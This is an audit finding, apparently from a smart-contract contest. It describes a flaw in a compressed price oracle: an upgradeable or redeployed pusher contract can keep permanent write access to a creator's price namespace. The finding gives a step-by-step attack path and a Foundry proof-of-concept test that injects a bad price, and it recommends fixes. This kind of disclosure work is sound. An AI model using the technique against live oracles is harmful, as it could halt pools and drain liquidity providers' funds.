### Title
`allowContractPushers` Permanently Trusts a Point-in-Time `isPusher` Snapshot — Upgradeable or Redeployed Pusher Contract Hijacks Creator Namespace and Feeds Bad Prices to Pools - (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowContractPushers` proves consent via a single live `isPusher(creator)` staticcall at delegation time and then writes `namespaceRemapping[pusher] = creator` with **no deadline, no expiry, and no re-verification**. The `fallback()` push path reads that mapping on every push. If the contract at the pusher address is later replaced — via an upgradeable proxy upgrade, or via `SELFDESTRUCT` + `CREATE2` redeploy — the new controller inherits permanent write authority over the creator's namespace and can push arbitrary prices into every feed the creator owns.

---

### Finding Description

`allowContractPushers` is the contract-pusher variant of the delegation path. Its design rationale is stated in the NatDoc:

> *"Contract-pusher variant: consent is proven by a LIVE `isPusher(creator)` staticcall instead of a signature, so there is nothing to replay and no deadline is needed."* [1](#0-0) 

The function performs a one-time staticcall to `pusher.isPusher(msg.sender)` and, if it returns `true`, permanently records `namespaceRemapping[pusher] = msg.sender`: [2](#0-1) 

The `fallback()` push path then resolves the namespace on every push by reading that mapping: [3](#0-2) 

The trust assumption is: **the contract at `pusher` that returned `true` at delegation time is the same entity that will call `fallback()` in the future.** This assumption is broken whenever the code or ownership at that address changes after delegation.

**Concrete attack path (upgradeable proxy):**

1. Alice (creator) deploys `PusherProxy` at `0xABC` — an upgradeable proxy whose current implementation returns `isPusher(alice) → true`.
2. Alice calls `allowContractPushers([0xABC])`. The oracle staticcalls `0xABC.isPusher(alice)` → `true`. `namespaceRemapping[0xABC] = alice` is written permanently.
3. The proxy admin (a separate key, a DAO, or a compromised multisig) upgrades `PusherProxy` to a malicious implementation. The `isPusher` check is now irrelevant — it is never re-evaluated.
4. The attacker calls the oracle's `fallback()` from `0xABC` with crafted slot words encoding an arbitrary price (e.g., `price = 0` or `price = MAX_U32`).
5. The oracle reads `namespaceRemapping[0xABC] = alice` and writes the attacker's price into Alice's namespace under the correct `feedIdOf(alice, slotIndex, positionIndex)`.
6. Any pool whose `AnchoredPriceProvider` or `ProtectedPriceProvider` is bound to Alice's feed now reads the corrupted price on the next swap.

The `feedIdOf` encoding embeds the creator address, so the corrupted slot is indistinguishable from a legitimate Alice push: [4](#0-3) 

The `AnchoredPriceProvider` reads this price through `_readLeg → offchainOracle.price(feedId, pool)` and applies the band clamp. A price of `0` causes `_getBidAndAskPrice` to return `(0, type(uint128).max)`, which `getBidAndAskPrice` surfaces as `FeedStalled` — halting all swaps. A price just outside the `priceGuard` range bypasses the guard (the guard is only checked in `OracleBase._oracleDataRaw` for provider oracles, not in the open `CompressedOracleV1` path) and reaches the pool as a bad bid/ask. [5](#0-4) 

The `SetAllowance.sol` deployment script confirms `allowContractPushers` is used in production: [6](#0-5) 

---

### Impact Explanation

A corrupted price in the creator's namespace reaches every pool registered against that feed. Depending on the injected value:

- **Price = 0 or sentinel spread (0xFF/0xFF):** `getBidAndAskPrice` returns `FeedStalled`, halting all swaps on affected pools — broken core pool functionality causing loss of funds or unusable swap flows.
- **Price far from true market:** Swappers receive more output than the oracle/bin curve permits (swap conservation failure) or LPs suffer insolvency as the pool's reserves are drained at the wrong price.
- **Inverted bid/ask:** The `bid >= ask` halt in `_computeBidAsk` triggers `FeedStalled`, again freezing the pool.

All three outcomes are within the contest-relevant impact gate (broken core pool functionality, swap conservation failure, bad-price execution).

---

### Likelihood Explanation

- Upgradeable proxies are the dominant contract pattern for production oracle pushers. The `SetAllowance.sol` script delegates to a contract address that is very likely a proxy.
- The attack requires no privileged oracle role — only control of the proxy admin key (a separate key from the creator key).
- The creator has no on-chain notification that the pusher contract changed; they must monitor off-chain and manually call `removePushers` before the attacker pushes.
- The `fallback()` push path has no re-verification of `isPusher` — the mapping is read once and trusted forever. [7](#0-6) 

---

### Recommendation

Add a re-verification step inside `fallback()` for contract pushers, **or** introduce a deadline/expiry to `allowContractPushers` analogous to the `deadline` parameter already required by `allowPushers`:

```solidity
// Option A: re-verify isPusher on every push (gas cost, but closes the window)
address creator = namespaceRemapping[msg.sender];
if (creator != address(0) && creator != msg.sender) {
    // re-check live consent for contract pushers
    (bool ok, bytes memory res) = msg.sender.staticcall(
        abi.encodeWithSignature("isPusher(address)", creator)
    );
    if (!ok || !abi.decode(res, (bool))) revert PusherConsentRevoked();
}

// Option B: store a delegation expiry alongside the remapping
mapping(address => uint256) public delegationExpiry;
// require(block.timestamp <= delegationExpiry[pusher]) in fallback
```

Option A mirrors the ZkSync team's recommendation: re-verify the trust assumption at the point of use, not just at setup. Option B is cheaper and mirrors the `deadline` guard already present in `allowPushers`. [8](#0-7) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from
    "smart-contracts-poc/contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "smart-contracts-poc/contracts/oracles/utils/U64x32.sol";

/// Simulates an upgradeable proxy: owner can swap the isPusher response.
contract UpgradeablePusher {
    address public owner;
    bool public allowAll;

    constructor(address _owner) { owner = _owner; }

    // Before upgrade: returns true only for the legitimate creator.
    function isPusher(address caller) external view returns (bool) {
        return allowAll || caller == owner;
    }

    // "Upgrade": attacker flips the flag so isPusher is irrelevant going forward.
    function upgrade() external { allowAll = true; }
}

contract ContractPusherHijackPoC is Test {
    CompressedOracleV1 oracle;
    address creator = address(0xC0FFEE);
    address attacker = address(0xA77AC);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        vm.warp(1_700_000_000);
    }

    function testHijackViaUpgradeableProxy() public {
        // 1. Creator deploys a proxy that returns isPusher(creator) = true.
        vm.prank(creator);
        UpgradeablePusher proxy = new UpgradeablePusher(creator);

        // 2. Creator delegates the proxy as a contract pusher.
        address[] memory pushers = new address[](1);
        pushers[0] = address(proxy);
        vm.prank(creator);
        oracle.allowContractPushers(pushers);
        assertEq(oracle.namespaceRemapping(address(proxy)), creator);

        // 3. Proxy is "upgraded" — attacker now controls it.
        //    isPusher is never re-checked by the oracle.
        proxy.upgrade(); // in a real proxy this would be upgradeToAndCall(maliciousImpl)

        // 4. Attacker pushes a bad price (price=1, i.e. near-zero) into creator's namespace.
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 badRaw = (uint48(1) << 16) | (uint48(5) << 8) | uint48(5); // price=1
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId=0
        word |= uint256(badRaw) << 208; // position 0

        vm.prank(attacker);
        // Attacker calls oracle fallback AS the proxy address (simulating proxy call)
        vm.prank(address(proxy));
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok, "attacker push succeeded");

        // 5. Creator's namespace now contains the attacker's price.
        bytes32 feedId = oracle.feedIdOf(creator, 0, 0);
        IOffchainOracle.OracleData memory data = oracle.getOracleData(feedId);
        assertEq(data.price, U64x32.decode(1), "bad price injected into creator namespace");
        // Any pool reading feedIdOf(creator, 0, 0) now gets price=1 (near-zero),
        // causing FeedStalled or a massively wrong bid/ask.
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L49-53)
```text
    function feedIdOf(address creator, uint8 slotIndex, uint8 positionIndex) public view returns (bytes32) {
        return bytes32(
            uint256(uint160(creator)) << 96 | block.chainid << 16 | uint256(slotIndex) << 8 | positionIndex
        );
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L214-234)
```text
    /// @notice Contract-pusher variant: consent is proven by a LIVE `isPusher(creator)`
    ///         staticcall instead of a signature, so there is nothing to replay and no
    ///         deadline is needed.
    function allowContractPushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            (bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
            require(ok);
            bool allowed = abi.decode(res, (bool));
            require(allowed);

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-344)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
            TimeMs timestampMs = toTimeMs(word >> 8 & X56);
            timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
            bytes32 key = bytes32(namespace | uint256(slotId));
            uint256 old = uint256(_loadStorage(key));
            TimeMs oldTimestampMs = toTimeMs(old >> 8 & X56);

            bool newer = timestampMs.isAfter(oldTimestampMs);
            if (!newer) continue;

            _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
        }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L258-270)
```text
    function _getBidAndAskPrice() internal returns (uint128, uint128) {
        (uint256 mid, uint256 spreadBps, , bool ok) = _readLeg(baseFeedId);
        if (!ok) return (0, type(uint128).max);

        bytes32 _quote = quoteFeedId;
        if (_quote != bytes32(0)) {
            (uint256 mid2, uint256 spreadBps2, , bool ok2) = _readLeg(_quote);
            if (!ok2 || mid2 == 0) return (0, type(uint128).max);
            // Synthetic ratio (8-decimal): mid1 / mid2. Relative uncertainties of a ratio add.
            mid = Math.mulDiv(mid, ORACLE_DECIMALS, mid2);
            spreadBps += spreadBps2;
        }

```

**File:** smart-contracts-poc/script/SetAllowance.sol (L19-23)
```text
        vm.startBroadcast(deployerKey);
        CompressedOracleV1 oracle = CompressedOracleV1(0x5EcF662aBB8C2AB099862F9Ef2DDc16CBC8A9977);
        oracle.removePushers(oldPushers);
        oracle.allowContractPushers(pushers);
    }
```
